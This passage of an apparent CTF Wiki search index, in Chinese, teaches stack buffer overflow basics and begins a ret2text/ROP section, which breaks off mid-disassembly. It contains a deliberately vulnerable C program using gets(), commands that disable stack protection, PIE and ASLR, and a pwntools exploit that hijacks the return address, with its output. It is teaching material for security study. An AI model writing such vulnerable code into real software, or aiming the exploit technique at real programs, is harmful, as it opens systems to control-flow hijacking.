6808\u57fa\u5730\u5740\u7684\u7d22\u5f15\uff0c\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u67e5\u770bEBP\u76f8\u5bf9\u504f\u79fb\u83b7\u5f97\uff1b\u76f8\u5bf9\u4e8e\u6808\u9876\u6307\u9488\u7684\u7d22\u5f15\uff0c\u4e00\u822c\u9700\u8981\u8fdb\u884c\u8c03\u8bd5\uff0c\u4e4b\u540e\u8fd8\u662f\u4f1a\u8f6c\u6362\u5230\u7b2c\u4e00\u79cd\u95ee\u9898\u3002\u901a\u8fc7\u7edd\u5bf9\u5730\u5740\u7d22\u5f15\u7684\uff0c\u5c31\u76f8\u5f53\u4e8e\u76f4\u63a5\u7ed9\u5b9a\u4e86\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u4f1a\u6709\u5982\u4e0b\u7684\u8986\u76d6\u9700\u6c42\n\n\n\n\n\u8986\u76d6\u51fd\u6570\u8fd4\u56de\u5730\u5740\n\uff0c\u8fd9\u65f6\u5019\u5c31\u662f\u76f4\u63a5\u770bEBP\u5373\u53ef\u3002\n\n\n\u8986\u76d6\u6808\u4e0a\u67d0\u4e2a\u53d8\u91cf\u7684\u5185\u5bb9\n\uff0c\u8fd9\u65f6\u5019\u5c31\u9700\u8981\u66f4\u52a0\u7cbe\u7ec6\u7684\u8ba1\u7b97\u4e86\u3002\n\n\n\u8986\u76d6bss\u6bb5\u67d0\u4e2a\u53d8\u91cf\u7684\u5185\u5bb9\n\u3002\n\n\n\u7b49\u7b49\n\n\n\n\n\u4e4b\u6240\u4ee5\u6211\u4eec\u60f3\u8981\u8986\u76d6\u67d0\u4e2a\u5730\u5740\uff0c\u662f\u56e0\u4e3a\u6211\u4eec\u60f3\u901a\u8fc7\u8986\u76d6\u5730\u5740\u7684\u65b9\u6cd5\u6765\u76f4\u63a5\u6216\u8005\u95f4\u63a5\u5730\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u3002\n\n\n\u53c2\u8003\u9605\u8bfb\n\n\nstack buffer overflow\n\n\nhttp://bobao.360.cn/learning/detail/3694.html\n\n\nhttps://www.cnblogs.com/rec0rd/p/7646857.html", 
            "title": "\u6808\u6ea2\u51fa\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/stackoverflow_basic/#_1", 
            "text": "", 
            "title": "\u6808\u6ea2\u51fa\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/stackoverflow_basic/#_2", 
            "text": "\u6808\u6ea2\u51fa\u6307\u7684\u662f\u7a0b\u5e8f\u5411\u6808\u4e2d\u67d0\u4e2a\u53d8\u91cf\u4e2d\u5199\u5165\u7684\u5b57\u8282\u6570\u8d85\u8fc7\u4e86\u8fd9\u4e2a\u53d8\u91cf\u672c\u8eab\u6240\u7533\u8bf7\u7684\u5b57\u8282\u6570\uff0c\u56e0\u800c\u5bfc\u81f4\u6808\u4e2d\u4e0e\u5176\u76f8\u90bb\u7684\u53d8\u91cf\u7684\u503c\u88ab\u6539\u53d8\u3002\u8fd9\u79cd\u95ee\u9898\u662f\u4e00\u79cd\u7279\u5b9a\u7684\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e(\u6bd4\u5982\u8bf4\uff0c\u8fd8\u6709\u5411\u5806\u4e2d\u5199\uff0c\u5411bss\u6bb5\u5199)\u3002\u800c\u5bf9\u4e8e\u9ed1\u5ba2\u6765\u8bf4\uff0c\u6808\u6ea2\u51fa\u6f0f\u6d1e\u8f7b\u5219\u53ef\u4ee5\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\uff0c\u91cd\u5219\u53ef\u4ee5\u4f7f\u5f97\u653b\u51fb\u8005\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u3002\u6b64\u5916\uff0c\u6211\u4eec\u4e5f\u4e0d\u96be\u53d1\u73b0\uff0c\u53d1\u751f\u6808\u6ea2\u51fa\u7684\u57fa\u672c\u524d\u63d0\u662f   \u7a0b\u5e8f\u5fc5\u987b\u5411\u6808\u4e0a\u5199\u5165\u6570\u636e\u3002  \u5199\u5165\u7684\u6570\u636e\u5927\u5c0f\u6ca1\u6709\u88ab\u826f\u597d\u5730\u63a7\u5236\u3002", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/stackoverflow/stackoverflow_basic/#_3", 
            "text": "\u6700\u5178\u578b\u7684\u6808\u6ea2\u51fa\u5229\u7528\u662f\u8986\u76d6\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u4e3a\u653b\u51fb\u8005\u6240\u63a7\u5236\u7684\u5730\u5740\uff0c \u5f53\u7136\u9700\u8981\u786e\u4fdd\u8fd9\u4e2a\u5730\u5740\u7684\u4ee3\u7801\u53ef\u4ee5\u6267\u884c \u3002\u4e0b\u9762\uff0c\u6211\u4eec\u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff1a  ##include  stdio.h  ##include  string.h  void   success ()   {   puts ( You Hava already controlled it. );   }  void   vulnerable ()   { \n   char   s [ 12 ]; \n   gets ( s ); \n   puts ( s ); \n   return ;  }  int   main ( int   argc ,   char   ** argv )   { \n   vulnerable (); \n   return   0 ;  }   \u8fd9\u4e2a\u7a0b\u5e8f\u7684\u4e3b\u8981\u76ee\u7684\u8bfb\u53d6\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5e76\u5c06\u5176\u8f93\u51fa\u3002 \u6211\u4eec\u5e0c\u671b\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u6267\u884csuccess\u51fd\u6570\u3002  \u6211\u4eec\u5229\u7528\u5982\u4e0b\u547d\u4ee4\u5bf9\u9f50\u8fdb\u884c\u7f16\u8bd1  \u279c  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example \nstack_example.c: In  function  \u2018vulnerable\u2019:\nstack_example.c:6:3: warning: implicit declaration of  function  \u2018gets\u2019  [ -Wimplicit-function-declaration ] \n   gets ( s ) ; \n   ^\n/tmp/ccPU8rRA.o\uff1a\u5728\u51fd\u6570\u2018vulnerable\u2019\u4e2d\uff1a\nstack_example.c: ( .text+0x27 ) : \u8b66\u544a\uff1a the  ` gets   function  is dangerous and should not be used.  \u53ef\u4ee5\u770b\u51fagets\u672c\u8eab\u662f\u4e00\u4e2a\u5371\u9669\u51fd\u6570\u3002\u800c\u5b83\u56e0\u4e3a\u5176\u4ece\u4e0d\u68c0\u67e5\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u800c\u662f\u4ee5\u56de\u8f66\u6765\u5224\u65ad\u662f\u5426\u8f93\u5165\u7ed3\u675f\uff0c\u6240\u4ee5\u5f88\u5bb9\u6613\u53ef\u4ee5\u5bfc\u81f4\u6808\u6ea2\u51fa\uff0c   \u5386\u53f2\u4e0a\uff0c \u83ab\u91cc\u65af\u8815\u866b \u7b2c\u4e00\u79cd\u8815\u866b\u75c5\u6bd2\u5c31\u5229\u7528\u4e86gets\u8fd9\u4e2a\u5371\u9669\u51fd\u6570\u5b9e\u73b0\u4e86\u6808\u6ea2\u51fa\u3002   gcc\u7f16\u8bd1\u6307\u4ee4\u4e2d\uff0c -m32  \u6307\u7684\u662f\u751f\u621032\u4f4d\u7a0b\u5e8f\uff1b  -fno-stack-protector  \u6307\u7684\u662f\u4e0d\u5f00\u542f\u5806\u6808\u6ea2\u51fa\u4fdd\u62a4\uff0c\u5373\u4e0d\u751f\u6210canary\u3002\n\u6b64\u5916\uff0c\u4e3a\u4e86\u66f4\u52a0\u65b9\u4fbf\u5730\u4ecb\u7ecd\u6808\u6ea2\u51fa\u7684\u57fa\u672c\u5229\u7528\u65b9\u5f0f\uff0c\u8fd9\u91cc\u8fd8\u9700\u8981\u5173\u95edPIE\uff08Position Independent Executable\uff09\uff0c\u907f\u514d\u52a0\u8f7d\u57fa\u5740\u88ab\u6253\u4e71\u3002\u4e0d\u540cgcc\u7248\u672c\u5bf9\u4e8ePIE\u7684\u9ed8\u8ba4\u914d\u7f6e\u4e0d\u540c\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4 gcc -v \u67e5\u770bgcc\u9ed8\u8ba4\u7684\u5f00\u5173\u60c5\u51b5\u3002\u5982\u679c\u542b\u6709 --enable-default-pie \u53c2\u6570\u5219\u4ee3\u8868PIE\u9ed8\u8ba4\u5df2\u5f00\u542f\uff0c\u9700\u8981\u5728\u7f16\u8bd1\u6307\u4ee4\u4e2d\u6dfb\u52a0\u53c2\u6570 -no-pie \u3002\u53ef\u4ee5\u4f7f\u7528checksec\u68c0\u67e5\u7f16\u8bd1\u51fa\u7684\u6587\u4ef6\uff1a \u279c  stack-example checksec stack_example\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)   \u63d0\u5230\u7f16\u8bd1\u65f6\u7684PIE\u4fdd\u62a4\uff0cLinux\u5e73\u53f0\u4e0b\u8fd8\u6709\u5730\u5740\u7a7a\u95f4\u5206\u5e03\u968f\u673a\u5316\uff08ASLR\uff09\u7684\u673a\u5236\u3002\u7b80\u5355\u6765\u8bf4\u5373\u4f7f\u53ef\u6267\u884c\u6587\u4ef6\u5f00\u542f\u4e86PIE\u4fdd\u62a4\uff0c\u8fd8\u9700\u8981\u7cfb\u7edf\u5f00\u542fASLR\u624d\u4f1a\u771f\u6b63\u6253\u4e71\u57fa\u5740\uff0c\u5426\u5219\u7a0b\u5e8f\u8fd0\u884c\u65f6\u4f9d\u65e7\u4f1a\u5728\u52a0\u8f7d\u4e00\u4e2a\u56fa\u5b9a\u7684\u57fa\u5740\u4e0a\uff08\u4e0d\u8fc7\u548cNo PIE\u65f6\u57fa\u5740\u4e0d\u540c\uff09\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539 /proc/sys/kernel/randomize_va_space \u6765\u63a7\u5236ASLR\u542f\u52a8\u4e0e\u5426\uff08\u4f7f\u7528 echo 0   /proc/sys/kernel/randomize_va_space \u5173\u95edLinux\u7cfb\u7edf\u7684ASLR\uff0c0\u66ff\u6362\u4e3a1\u62162\u5219\u4e3a\u5f00\u542f\uff09\u3002\u4e3a\u4e86\u964d\u4f4e\u540e\u7eed\u6559\u7a0b\u590d\u6742\u5ea6\uff0c\u6211\u4eec\u9009\u62e9\u5ffd\u7565ASLR\u7684\u72b6\u6001\uff0c\u76f4\u63a5\u5728\u7f16\u8bd1\u65f6\u5173\u95edPIE\u3002\u5f53\u7136\u8bfb\u8005\u4e5f\u53ef\u4ee5\u5c1d\u8bd5ASLR\u3001PIE\u5f00\u5173\u7684\u4e0d\u540c\u7ec4\u5408\uff0c\u914d\u5408IDA\u53ca\u5176\u52a8\u6001\u8c03\u8bd5\u529f\u80fd\u89c2\u5bdf\u7a0b\u5e8f\u5730\u5740\u53d8\u5316\u60c5\u51b5\uff08\u5728ASLR\u5173\u95ed\u3001PIE\u5f00\u542f\u65f6\u4e5f\u53ef\u4ee5\u653b\u51fb\u6210\u529f\uff09\u3002   \u786e\u8ba4\u6808\u6ea2\u51fa\u548cPIE\u4fdd\u62a4\u5173\u95ed\u540e\uff0c\u6211\u4eec\u5229\u7528IDA\u6765\u53cd\u7f16\u8bd1\u4e00\u4e0b\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u5e76\u67e5\u770bvulnerable\u51fd\u6570 \u3002\u53ef\u4ee5\u770b\u5230  int   vulnerable ()  { \n   char   s ;   // [sp+4h] [bp-14h]@1 \n\n   gets ( s ); \n   return   puts ( s );  }   \u8be5\u5b57\u7b26\u4e32\u8ddd\u79bbebp\u7684\u957f\u5ea6\u4e3a0x14\uff0c\u90a3\u4e48\u76f8\u5e94\u7684\u6808\u7ed3\u6784\u4e3a                                             +-----------------+\n                                           |     retaddr     |\n                                           +-----------------+\n                                           |     saved ebp   |\n                                    ebp--- +-----------------+\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                              s,ebp-0x14-- +-----------------+  \u5e76\u4e14\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7IDA\u83b7\u5f97success\u7684\u5730\u5740\uff0c\u5176\u5730\u5740\u4e3a0x0804846B\u3002  .text: 0804843 B   success           proc   near  .text: 0804843 B                   push      ebp  .text: 0804843 C                   mov       ebp ,   esp  .text: 0804843 E                   sub       esp ,   8  .text: 08048441                   sub       esp ,   0 Ch  .text: 08048444                   push      offset   s          ;  You Hava already controlled it.  .text : 08048449                   call      _puts  .text: 0804844 E                   add       esp ,   10 h  .text: 08048451                   nop  .text: 08048452                   leave  .text: 08048453                   retn  .text: 08048453   success           endp   \u90a3\u4e48\u5982\u679c\u6211\u4eec\u8bfb\u53d6\u7684\u5b57\u7b26\u4e32\u4e3a  0x14* a + bbbb +success_addr  \u90a3\u4e48\uff0c\u7531\u4e8egets\u4f1a\u8bfb\u5230\u56de\u8f66\u624d\u7b97\u7ed3\u675f\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6\u6240\u6709\u7684\u5b57\u7b26\u4e32\uff0c\u5e76\u4e14\u5c06saved ebp\u8986\u76d6\u4e3abbbb\uff0c\u5c06retaddr\u8986\u76d6\u4e3asuccess_addr\uff0c\u5373\uff0c\u6b64\u65f6\u7684\u6808\u7ed3\u6784\u4e3a                                             +-----------------+\n                                           |    0x0804843B   |\n                                           +-----------------+\n                                           |       bbbb      |\n                                    ebp--- +-----------------+\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                              s,ebp-0x14-- +-----------------+  \u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e\u5728\u8ba1\u7b97\u673a\u5185\u5b58\u4e2d\uff0c\u5bf9\u5e94\u7684\u6bcf\u4e2a\u503c\u90fd\u662f\u6309\u7167\u5b57\u8282\u5b58\u50a8\u7684\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\u90fd\u662f\u91c7\u7528\u5c0f\u7aef\u5b58\u50a8\uff0c\u53730x0804843B\u7684\u5b58\u50a8\u662f\u5982\u4e0b\u7ed3\u6784  \\x3b\\x84\\x04\\x08  \u4f46\u662f\uff0c\u6211\u4eec\u53c8\u4e0d\u80fd\u76f4\u63a5\u5728\u7ec8\u7aef\u5c06\u8fd9\u4e9b\u5b57\u7b26\u7ed9\u8f93\u5165\u8fdb\u53bb\uff0c\u5728\u7ec8\u7aef\u8f93\u5165\u7684\u65f6\u5019\\\uff0cx\u7b49\u4e5f\u7b97\u4e00\u4e2a\u5355\u72ec\u7684\u5b57\u7b26\u3002\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u60f3\u529e\u6cd5\u5c06\\x3b\u4e4b\u7c7b\u7684\u4f5c\u4e3a\u4e00\u4e2a\u5b57\u7b26\u8f93\u5165\u8fdb\u53bb\u3002\u90a3\u4e48\u6b64\u65f6\u6211\u4eec\u5c31\u9700\u8981\u4f7f\u7528\u4e00\u6ce2pwntools\u4e86(\u5173\u4e8e\u5982\u4f55\u5b89\u88c5\u4ee5\u53ca\u57fa\u672c\u7528\u6cd5\uff0c\u8bf7\u81ea\u884cgithub)\uff0c\u8fd9\u91cc\u5229\u7528pwntools\u7684\u4ee3\u7801\u5982\u4e0b\uff1a  ##coding=utf8  from   pwn   import   *  ## \u6784\u9020\u4e0e\u7a0b\u5e8f\u4ea4\u4e92\u7684\u5bf9\u8c61  sh   =   process ( ./stack_example )  success_addr   =   0x0804843b  ## \u6784\u9020payload  payload   =   a   *   0x14   +   bbbb   +   p32 ( success_addr )  print   p32 ( success_addr )  ## \u5411\u7a0b\u5e8f\u53d1\u9001\u5b57\u7b26\u4e32  sh . sendline ( payload )  ## \u5c06\u4ee3\u7801\u4ea4\u4e92\u8f6c\u6362\u4e3a\u624b\u5de5\u4ea4\u4e92  sh . interactive ()   \u6267\u884c\u4e00\u6ce2\u4ee3\u7801\uff0c\u53ef\u4ee5\u5f97\u5230  \u279c  stack-example python exp.py [ + ]  Starting  local  process  ./stack_example : pid  61936  ; \\x 84 \\x 0  [ * ]  Switching to interactive mode\naaaaaaaaaaaaaaaaaaaabbbb ; \\x 84 \\x 0 \nYou Hava already controlled it. [ * ]  Got EOF  while  reading in interactive\n$  [ * ]  Process  ./stack_example  stopped with  exit  code -11  ( SIGSEGV )   ( pid  61936 )  [ * ]  Got EOF  while  sending in interactive  \u53ef\u4ee5\u770b\u5230\u6211\u4eec\u786e\u5b9e\u5df2\u7ecf\u6267\u884csuccess\u51fd\u6570\u3002", 
            "title": "\u57fa\u672c\u793a\u4f8b"
        }, 
        {
            "location": "/pwn/stackoverflow/stackoverflow_basic/#_4", 
            "text": "\u4e0a\u9762\u7684\u793a\u4f8b\u5176\u5b9e\u4e5f\u5c55\u793a\u4e86\u6808\u6ea2\u51fa\u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u51e0\u4e2a\u6b65\u9aa4:", 
            "title": "\u5c0f\u603b\u7ed3"
        }, 
        {
            "location": "/pwn/stackoverflow/stackoverflow_basic/#_5", 
            "text": "\u901a\u8fc7\u5bfb\u627e\u5371\u9669\u51fd\u6570\uff0c\u6211\u4eec\u5feb\u901f\u786e\u5b9a\u7a0b\u5e8f\u662f\u5426\u53ef\u80fd\u6709\u6808\u6ea2\u51fa\uff0c\u4ee5\u53ca\u6709\u7684\u8bdd\uff0c\u6808\u6ea2\u51fa\u7684\u4f4d\u7f6e\u5728\u54ea\u91cc\u3002  \u5e38\u89c1\u7684\u5371\u9669\u51fd\u6570\u5982\u4e0b   \u8f93\u5165  gets\uff0c\u76f4\u63a5\u8bfb\u53d6\u4e00\u884c\uff0c\u5ffd\u7565'\\x00'  scanf  vscanf    \u8f93\u51fa  sprintf    \u5b57\u7b26\u4e32  strcpy\uff0c\u5b57\u7b26\u4e32\u590d\u5236\uff0c\u9047\u5230'\\x00'\u505c\u6b62  strcat\uff0c\u5b57\u7b26\u4e32\u62fc\u63a5\uff0c\u9047\u5230'\\x00'\u505c\u6b62  bcopy", 
            "title": "\u5bfb\u627e\u5371\u9669\u51fd\u6570"
        }, 
        {
            "location": "/pwn/stackoverflow/stackoverflow_basic/#_6", 
            "text": "\u8fd9\u4e00\u90e8\u5206\u4e3b\u8981\u662f\u8ba1\u7b97 \u6211\u4eec\u6240\u8981\u64cd\u4f5c\u7684\u5730\u5740\u4e0e\u6211\u4eec\u6240\u8981\u8986\u76d6\u7684\u5730\u5740\u7684\u8ddd\u79bb \u3002\u5e38\u89c1\u7684\u64cd\u4f5c\u65b9\u6cd5\u5c31\u662f\u6253\u5f00IDA\uff0c\u6839\u636e\u5176\u7ed9\u5b9a\u7684\u5730\u5740\u8ba1\u7b97\u504f\u79fb\u3002\u4e00\u822c\u53d8\u91cf\u4f1a\u6709\u4ee5\u4e0b\u51e0\u79cd\u7d22\u5f15\u6a21\u5f0f   \u76f8\u5bf9\u4e8e\u6808\u57fa\u5730\u5740\u7684\u7684\u7d22\u5f15  \u76f8\u5bf9\u5e94\u6808\u9876\u6307\u9488\u7684\u7d22\u5f15  \u76f4\u63a5\u5730\u5740\u7d22\u5f15   \u5176\u4e2d\u76f8\u5bf9\u4e8e\u6808\u57fa\u5730\u5740\u7684\u7d22\u5f15\uff0c\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u67e5\u770bEBP\u76f8\u5bf9\u504f\u79fb\u83b7\u5f97\uff1b\u76f8\u5bf9\u4e8e\u6808\u9876\u6307\u9488\u7684\u7d22\u5f15\uff0c\u4e00\u822c\u9700\u8981\u8fdb\u884c\u8c03\u8bd5\uff0c\u4e4b\u540e\u8fd8\u662f\u4f1a\u8f6c\u6362\u5230\u7b2c\u4e00\u79cd\u95ee\u9898\u3002\u901a\u8fc7\u7edd\u5bf9\u5730\u5740\u7d22\u5f15\u7684\uff0c\u5c31\u76f8\u5f53\u4e8e\u76f4\u63a5\u7ed9\u5b9a\u4e86\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u4f1a\u6709\u5982\u4e0b\u7684\u8986\u76d6\u9700\u6c42   \u8986\u76d6\u51fd\u6570\u8fd4\u56de\u5730\u5740 \uff0c\u8fd9\u65f6\u5019\u5c31\u662f\u76f4\u63a5\u770bEBP\u5373\u53ef\u3002  \u8986\u76d6\u6808\u4e0a\u67d0\u4e2a\u53d8\u91cf\u7684\u5185\u5bb9 \uff0c\u8fd9\u65f6\u5019\u5c31\u9700\u8981\u66f4\u52a0\u7cbe\u7ec6\u7684\u8ba1\u7b97\u4e86\u3002  \u8986\u76d6bss\u6bb5\u67d0\u4e2a\u53d8\u91cf\u7684\u5185\u5bb9 \u3002  \u7b49\u7b49   \u4e4b\u6240\u4ee5\u6211\u4eec\u60f3\u8981\u8986\u76d6\u67d0\u4e2a\u5730\u5740\uff0c\u662f\u56e0\u4e3a\u6211\u4eec\u60f3\u901a\u8fc7\u8986\u76d6\u5730\u5740\u7684\u65b9\u6cd5\u6765\u76f4\u63a5\u6216\u8005\u95f4\u63a5\u5730\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u3002  \u53c2\u8003\u9605\u8bfb  stack buffer overflow  http://bobao.360.cn/learning/detail/3694.html  https://www.cnblogs.com/rec0rd/p/7646857.html", 
            "title": "\u786e\u5b9a\u586b\u5145\u957f\u5ea6"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/", 
            "text": "\u57fa\u672cROP\n\n\n\u968f\u7740NX\u4fdd\u62a4\u7684\u5f00\u542f\uff0c\u4ee5\u5f80\u76f4\u63a5\u5411\u6808\u6216\u8005\u5806\u4e0a\u76f4\u63a5\u6ce8\u5165\u4ee3\u7801\u7684\u65b9\u5f0f\u96be\u4ee5\u7ee7\u7eed\u53d1\u6325\u6548\u679c\u3002\u653b\u51fb\u8005\u4eec\u4e5f\u63d0\u51fa\u6765\u76f8\u5e94\u7684\u65b9\u6cd5\u6765\u7ed5\u8fc7\u4fdd\u62a4\uff0c\u76ee\u524d\u4e3b\u8981\u7684\u662fROP(Return Oriented Programming)\uff0c\u5176\u4e3b\u8981\u601d\u60f3\u662f\u5728\n\u6808\u7f13\u51b2\u533a\u6ea2\u51fa\u7684\u57fa\u7840\u4e0a(\u8fd9\u4e00\u6761\u4e4b\u540e\u4e0d\u518d\u91cd\u590d\u63d0\u53ca)\uff0c\u901a\u8fc7\u5229\u7528\u7a0b\u5e8f\u4e2d\u5df2\u6709\u7684\u5c0f\u7247\u6bb5(gadgets)\u6765\u6539\u53d8\u67d0\u4e9b\u5bc4\u5b58\u5668\u6216\u8005\u53d8\u91cf\u7684\u503c\uff0c\u4ece\u800c\u6539\u53d8\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002\n\u6240\u8c13gadgets\u5c31\u662f\u4ee5ret\u7ed3\u5c3e\u7684\u6307\u4ee4\u5e8f\u5217\uff0c\u901a\u8fc7\u8fd9\u4e9b\u6307\u4ee4\u5e8f\u5217\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u67d0\u4e9b\u5730\u5740\u7684\u5185\u5bb9\uff0c\u65b9\u4fbf\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002\n\n\n\u4e4b\u6240\u4ee5\u79f0\u4e4b\u4e3aROP\uff0c\u662f\u56e0\u4e3a\u6838\u5fc3\u5728\u4e8e\u5229\u7528\u4e86\u6307\u4ee4\u96c6\u4e2d\u7684ret\u6307\u4ee4\uff0c\u6539\u53d8\u4e86\u6307\u4ee4\u6d41\u7684\u6267\u884c\u987a\u5e8f\u3002ROP\u653b\u51fb\u4e00\u822c\u5f97\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6\n\n\n\n\n\u7a0b\u5e8f\u5b58\u5728\u6ea2\u51fa\uff0c\u5e76\u4e14\u53ef\u4ee5\u63a7\u5236\u8fd4\u56de\u5730\u5740\u3002\n\n\n\u53ef\u4ee5\u627e\u5230\u6ee1\u8db3\u6761\u4ef6\u7684gadgets\u4ee5\u53ca\u76f8\u5e94gadgets\u7684\u5730\u5740\u3002\u5982\u679c\u5f53\u7a0b\u5e8f\u5f00\u542f\u4e86PIE\u4fdd\u62a4\uff0c\u90a3\u4e48\u5c31\u5fc5\u987b\u60f3\u529e\u6cd5\u6cc4\u9732gadgets\u7684\u5730\u5740\u4e86\u3002\n\n\n\n\nret2text\n\n\n\u539f\u7406\n\n\nret2text\u5373\u9700\u8981\u6211\u4eec\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u7a0b\u5e8f\u672c\u8eab\u5df2\u6709\u7684\u7684\u4ee3\u7801(.text)\u3002\u5176\u5b9e\uff0c\u8fd9\u79cd\u653b\u51fb\u65b9\u6cd5\u662f\u4e00\u79cd\u7b3c\u7edf\u7684\u63cf\u8ff0\u3002\u6211\u4eec\u63a7\u5236\u6267\u884c\u7a0b\u5e8f\u5df2\u6709\u7684\u4ee3\u7801\u7684\u65f6\u5019\u4e5f\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u597d\u51e0\u6bb5\u4e0d\u76f8\u90bb\u7684\u7a0b\u5e8f\u5df2\u6709\u7684\u4ee3\u7801(\u4e5f\u5c31\u662fgadgets)\uff0c\u8fd9\u5c31\u662f\u6211\u4eec\u6240\u8981\u8bf4\u7684rop\u3002\n\n\n\u8fd9\u65f6\uff0c\u6211\u4eec\u9700\u8981\u77e5\u9053\u5bf9\u5e94\u8fd4\u56de\u7684\u4ee3\u7801\u7684\u4f4d\u7f6e\u3002\u5f53\u7136\u7a0b\u5e8f\u4e5f\u53ef\u80fd\u4f1a\u5f00\u542f\u67d0\u4e9b\u4fdd\u62a4\uff0c\u6211\u4eec\u9700\u8981\u60f3\u529e\u6cd5\u53bb\u7ed5\u8fc7\u8fd9\u4e9b\u4fdd\u62a4\u3002\n\n\n\u4f8b\u5b50\n\n\n\u5176\u5b9e\uff0c\u5728\u6808\u6ea2\u51fa\u7684\u57fa\u672c\u539f\u7406\u4e2d\uff0c\u6211\u4eec\u5df2\u7ecf\u4ecb\u7ecd\u4e86\u8fd9\u4e00\u7b80\u5355\u7684\u653b\u51fb\u3002\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u518d\u7ed9\u51fa\u53e6\u5916\u4e00\u4e2a\u4f8b\u5b50\uff0cbamboofox\u4e2d\u4ecb\u7ecdROP\u65f6\u4f7f\u7528\u7684ret2text\u7684\u4f8b\u5b50\u3002\n\n\n\u70b9\u51fb\u4e0b\u8f7d: \nret2text\n\n\n\u9996\u5148\uff0c\u67e5\u770b\u4e00\u4e0b\u7a0b\u5e8f\u7684\u4fdd\u62a4\u673a\u5236\n\n\n\u279c  ret2text checksec ret2text\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u662f32\u4f4d\u7a0b\u5e8f\uff0c\u5176\u4ec5\u4ec5\u5f00\u542f\u4e86\u6808\u4e0d\u53ef\u6267\u884c\u4fdd\u62a4\u3002\u7136\u540e\uff0c\u6211\u4eec\u4f7f\u7528IDA\u6765\u67e5\u770b\u6e90\u4ee3\u7801\u3002\n\n\nint\n \n__cdecl\n \nmain\n(\nint\n \nargc\n,\n \nconst\n \nchar\n \n**\nargv\n,\n \nconst\n \nchar\n \n**\nenvp\n)\n\n\n{\n\n  \nint\n \nv4\n;\n \n// [sp+1Ch] [bp-64h]@1\n\n\n  \nsetvbuf\n(\nstdout\n,\n \n0\n,\n \n2\n,\n \n0\n);\n\n  \nsetvbuf\n(\n_bss_start\n,\n \n0\n,\n \n1\n,\n \n0\n);\n\n  \nputs\n(\nThere is something amazing here, do you know anything?\n);\n\n  \ngets\n((\nchar\n \n*\n)\nv4\n);\n\n  \nprintf\n(\nMaybe I will tell you next time !\n);\n\n  \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u5728\u4e3b\u51fd\u6570\u4e2d\u4f7f\u7528\u4e86gets\u51fd\u6570\uff0c\u663e\u7136\u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e\u3002\u6b64\u540e\u53c8\u53d1\u73b0\n\n\n.text:\n080485\nFD\n \nsecure\n          \nproc\n \nnear\n\n\n.text:\n080485\nFD\n\n\n.text:\n080485\nFD\n \ninput\n           \n=\n \ndword\n \nptr\n \n-\n10\nh\n\n\n.text:\n080485\nFD\n \nsecretcode\n      \n=\n \ndword\n \nptr\n \n-\n0\nCh\n\n\n.text:\n080485\nFD\n\n\n.text:\n080485\nFD\n                 \npush\n    \nebp\n\n\n.text:\n080485\nFE\n                 \nmov\n     \nebp\n,\n \nesp\n\n\n.text:\n08048600\n                 \nsub\n     \nesp\n,\n \n28\nh\n\n\n.text:\n08048603\n                 \nmov\n     \ndword\n \nptr\n \n[\nesp\n],\n \n0\n \n; timer\n\n\n.text\n:\n0804860\nA\n                 \ncall\n    \n_time\n\n\n.text:\n0804860\nF\n                 \nmov\n     \n[\nesp\n],\n \neax\n      \n; seed\n\n\n.text\n:\n08048612\n                 \ncall\n    \n_srand\n\n\n.text:\n08048617\n                 \ncall\n    \n_rand\n\n\n.text:\n0804861\nC\n                 \nmov\n     \n[\nebp\n+\nsecretcode\n],\n \neax\n\n\n.text:\n0804861\nF\n                 \nlea\n     